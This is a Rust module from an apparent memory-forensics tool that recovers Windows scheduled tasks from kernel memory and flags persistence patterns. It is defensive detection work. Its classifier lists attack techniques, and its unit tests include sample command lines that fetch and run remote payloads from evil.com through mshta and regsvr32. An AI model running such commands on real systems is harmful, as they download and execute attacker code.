//! Windows scheduled task persistence detection.
//!
//! Scheduled tasks are a common persistence mechanism — malware creates tasks
//! that survive reboot via `schtasks.exe` or COM-based APIs. The Task Scheduler
//! service stores task definitions in `_TASK_ENTRY` structures accessible
//! through the `TaskSchedulerService` or `ubpm` kernel objects.
//!
//! Enumerating scheduled tasks from memory captures tasks that may have been
//! deleted from disk but remain in the service's in-memory cache.

use memf_core::object_reader::ObjectReader;
use memf_format::PhysicalMemoryProvider;

use crate::unicode::read_unicode_string;

/// Maximum number of scheduled task entries to walk (safety limit).
const MAX_TASKS: usize = 4096;

/// Information about a scheduled task recovered from kernel memory.
#[derive(Debug, Clone, serde::Serialize)]
pub struct ScheduledTaskInfo {
    /// Task name (e.g., "\Microsoft\Windows\UpdateOrchestrator\Schedule Scan").
    pub name: String,
    /// Task path in the Task Scheduler namespace.
    pub path: String,
    /// Action command line (what the task executes).
    pub action: String,
    /// Task author.
    pub author: String,
    /// Whether the task is currently enabled.
    pub enabled: bool,
    /// Last run time (FILETIME).
    pub last_run_time: u64,
    /// Next run time (FILETIME).
    pub next_run_time: u64,
    /// Whether this task looks suspicious.
    pub is_suspicious: bool,
}

/// Classify a scheduled task as suspicious.
///
/// Returns `true` for tasks that match patterns commonly used for persistence:
/// - Action contains encoded commands (powershell -enc, cmd /c)
/// - Task in unusual paths (not under \Microsoft\Windows)
/// - Action references temp directories or user-writable locations
pub fn classify_scheduled_task(name: &str, action: &str) -> bool {
    if name.is_empty() || action.is_empty() {
        return false;
    }

    let action_lower = action.to_ascii_lowercase();

    // Encoded/obfuscated commands
    if action_lower.contains("-enc") || action_lower.contains("-encodedcommand") {
        return true;
    }

    // Commands from suspicious locations
    if action_lower.contains("\\temp\\")
        || action_lower.contains("\\tmp\\")
        || action_lower.contains("\\appdata\\")
        || action_lower.contains("\\downloads\\")
        || action_lower.contains("\\public\\")
    {
        return true;
    }

    // Known suspicious patterns
    if action_lower.contains("mshta") || action_lower.contains("regsvr32 /s /n /u /i:") {
        return true;
    }

    // Task in non-standard path with script execution
    let name_lower = name.to_ascii_lowercase();
    if !name_lower.starts_with("\\microsoft\\") && !name_lower.starts_with("microsoft\\") {
        if action_lower.contains("powershell")
            || action_lower.contains("wscript")
            || action_lower.contains("cscript")
        {
            return true;
        }
    }

    false
}

/// Enumerate scheduled tasks from the Task Scheduler service memory.
///
/// Looks up `UbpmTaskEnumerator` or `TaskSchedulerService` to find
/// in-memory task definitions. Returns an empty `Vec` if the required
/// symbols are not present.
pub fn walk_scheduled_tasks<P: PhysicalMemoryProvider>(
    reader: &ObjectReader<P>,
) -> crate::Result<Vec<ScheduledTaskInfo>> {
    // Try UbpmTaskEnumerator first, then TaskSchedulerTaskList.
    let list_head = match reader.symbols().symbol_address("UbpmTaskEnumerator") {
        Some(addr) => addr,
        None => match reader.symbols().symbol_address("TaskSchedulerTaskList") {
            Some(addr) => addr,
            None => return Ok(Vec::new()),
        },
    };

    // Resolve _TASK_ENTRY field offsets.
    let task_list_entry_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "TaskListEntry")
        .unwrap_or(0x00);

    let name_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "Name")
        .unwrap_or(0x10);

    let path_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "Path")
        .unwrap_or(0x20);

    let action_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "Action")
        .unwrap_or(0x30);

    let author_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "Author")
        .unwrap_or(0x40);

    let enabled_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "Enabled")
        .unwrap_or(0x50);

    let last_run_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "LastRunTime")
        .unwrap_or(0x58);

    let next_run_off = reader
        .symbols()
        .field_offset("_TASK_ENTRY", "NextRunTime")
        .unwrap_or(0x60);

    // Read head Flink.
    let first = match reader.read_bytes(list_head, 8) {
        Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
        _ => return Ok(Vec::new()),
    };

    if first == 0 || first == list_head {
        return Ok(Vec::new());
    }

    let mut tasks = Vec::new();
    let mut current = first;
    let mut seen = std::collections::HashSet::new();

    while current != list_head && current != 0 && tasks.len() < MAX_TASKS {
        if !seen.insert(current) {
            break; // Cycle detection.
        }

        // current points to TaskListEntry within _TASK_ENTRY.
        let task_addr = current.wrapping_sub(task_list_entry_off);

        // Read UNICODE_STRING fields.
        let name = read_unicode_string(reader, task_addr + name_off).unwrap_or_default();
        let path = read_unicode_string(reader, task_addr + path_off).unwrap_or_default();
        let action = read_unicode_string(reader, task_addr + action_off).unwrap_or_default();
        let author = read_unicode_string(reader, task_addr + author_off).unwrap_or_default();

        // Read enabled flag (u32, nonzero = enabled).
        let enabled = match reader.read_bytes(task_addr + enabled_off, 4) {
            Ok(bytes) if bytes.len() == 4 => {
                u32::from_le_bytes(bytes[..4].try_into().unwrap()) != 0
            }
            _ => false,
        };

        // Read timestamps (FILETIME u64).
        let last_run_time = match reader.read_bytes(task_addr + last_run_off, 8) {
            Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
            _ => 0,
        };

        let next_run_time = match reader.read_bytes(task_addr + next_run_off, 8) {
            Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
            _ => 0,
        };

        let is_suspicious = classify_scheduled_task(&name, &action);

        tasks.push(ScheduledTaskInfo {
            name,
            path,
            action,
            author,
            enabled,
            last_run_time,
            next_run_time,
            is_suspicious,
        });

        // Follow Flink to next entry.
        current = match reader.read_bytes(current, 8) {
            Ok(bytes) if bytes.len() == 8 => u64::from_le_bytes(bytes[..8].try_into().unwrap()),
            _ => break,
        };
    }

    Ok(tasks)
}

#[cfg(test)]
mod tests {
    use super::*;
    use memf_core::object_reader::ObjectReader;
    use memf_core::test_builders::{flags, PageTableBuilder};
    use memf_core::vas::{TranslationMode, VirtualAddressSpace};
    use memf_symbols::isf::IsfResolver;
    use memf_symbols::test_builders::IsfBuilder;

    /// No scheduled task symbol → empty Vec.
    #[test]
    fn walk_scheduled_tasks_no_symbol() {
        let isf = IsfBuilder::new()
            .add_struct("_TASK_ENTRY", 0x80)
            .build_json();
        let resolver = IsfResolver::from_value(&isf).unwrap();
        let (cr3, mem) = PageTableBuilder::new().build();
        let vas = VirtualAddressSpace::new(mem, cr3, TranslationMode::X86_64FourLevel);
        let reader = ObjectReader::new(vas, Box::new(resolver));

        let result = walk_scheduled_tasks(&reader).unwrap();
        assert!(result.is_empty());
    }

    /// Benign Microsoft tasks are not suspicious.
    #[test]
    fn classify_benign_microsoft_task() {
        assert!(!classify_scheduled_task(
            "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
            "C:\\Windows\\System32\\usoclient.exe StartScan"
        ));
    }

    /// Tasks with encoded PowerShell commands are suspicious.
    #[test]
    fn classify_suspicious_encoded_command() {
        assert!(classify_scheduled_task(
            "\\CustomTask",
            "powershell.exe -enc ZQBjAGgAbwAgACIAaABlAGwAbABvACIA"
        ));
    }

    /// Tasks executing from temp directories are suspicious.
    #[test]
    fn classify_suspicious_temp_path() {
        assert!(classify_scheduled_task(
            "\\Microsoft\\Windows\\MyTask",
            "C:\\Users\\admin\\AppData\\Local\\Temp\\malware.exe"
        ));
    }

    /// Non-Microsoft tasks running PowerShell are suspicious.
    #[test]
    fn classify_suspicious_nonstandard_powershell() {
        assert!(classify_scheduled_task(
            "\\UpdateChecker",
            "powershell.exe -File C:\\Scripts\\update.ps1"
        ));
    }

    /// Empty name or action is not suspicious.
    #[test]
    fn classify_empty_not_suspicious() {
        assert!(!classify_scheduled_task("", ""));
        assert!(!classify_scheduled_task("\\Task", ""));
        assert!(!classify_scheduled_task("", "cmd.exe"));
    }

    /// -encodedcommand flag is suspicious.
    #[test]
    fn classify_suspicious_encodedcommand_flag() {
        assert!(classify_scheduled_task(
            "\\BadTask",
            "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA"
        ));
    }

    /// tmp directory in action is suspicious.
    #[test]
    fn classify_suspicious_tmp_path() {
        assert!(classify_scheduled_task(
            "\\Task",
            "C:\\Windows\\Temp\\tmp\\evil.exe"
        ));
    }

    /// Downloads directory in action is suspicious.
    #[test]
    fn classify_suspicious_downloads_path() {
        assert!(classify_scheduled_task(
            "\\Task",
            "C:\\Users\\User\\Downloads\\backdoor.exe"
        ));
    }

    /// Public directory in action is suspicious.
    #[test]
    fn classify_suspicious_public_path() {
        assert!(classify_scheduled_task(
            "\\Task",
            "C:\\Users\\Public\\update.exe"
        ));
    }

    /// mshta in action is suspicious regardless of task path.
    #[test]
    fn classify_suspicious_mshta() {
        assert!(classify_scheduled_task(
            "\\Microsoft\\Windows\\Legit",
            "mshta.exe http://evil.com/payload.hta"
        ));
    }

    /// regsvr32 /s /n /u /i: pattern is suspicious.
    #[test]
    fn classify_suspicious_regsvr32() {
        assert!(classify_scheduled_task(
            "\\Task",
            "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll"
        ));
    }

    /// wscript on non-Microsoft task is suspicious.
    #[test]
    fn classify_suspicious_wscript_nonstandard() {
        assert!(classify_scheduled_task(
            "\\EvilTask",
            "wscript.exe C:\\evil\\payload.vbs"
        ));
    }

    /// cscript on non-Microsoft task is suspicious.
    #[test]
    fn classify_suspicious_cscript_nonstandard() {
        assert!(classify_scheduled_task(
            "\\UpdateTask",
            "cscript.exe //nologo C:\\scripts\\evil.vbs"
        ));
    }

    /// powershell on Microsoft-prefixed task (without suspicious flags) is benign.
    #[test]
    fn classify_microsoft_powershell_benign() {
        assert!(!classify_scheduled_task(
            "\\Microsoft\\Windows\\PowerShell",
            "powershell.exe -NonInteractive -Command Get-Item C:\\Windows"
        ));
    }

    /// microsoft\\ prefix (no leading backslash) is also treated as standard.
    #[test]
    fn classify_microsoft_no_leading_slash_benign() {
        assert!(!classify_scheduled_task(
            "Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan",
            "C:\\Windows\\System32\\usoclient.exe StartScan"
        ));
    }

    /// ScheduledTaskInfo serializes correctly.
    #[test]
    fn scheduled_task_info_serializes() {
        let info = ScheduledTaskInfo {
            name: "\\EvilTask".to_string(),
            path: "\\EvilTask".to_string(),
            action: "powershell.exe -enc AAAA".to_string(),
            author: "SYSTEM".to_string(),
            enabled: true,
            last_run_time: 0x01D8_ABCD_1234_5678,
            next_run_time: 0x01D8_DCBA_8765_4321,
            is_suspicious: true,
        };

        let json = serde_json::to_string(&info).unwrap();
        assert!(json.contains("\"name\":\"\\\\EvilTask\""));
        assert!(json.contains("\"enabled\":true"));
        assert!(json.contains("\"is_suspicious\":true"));
        assert!(json.contains("\"author\":\"SYSTEM\""));
    }
}
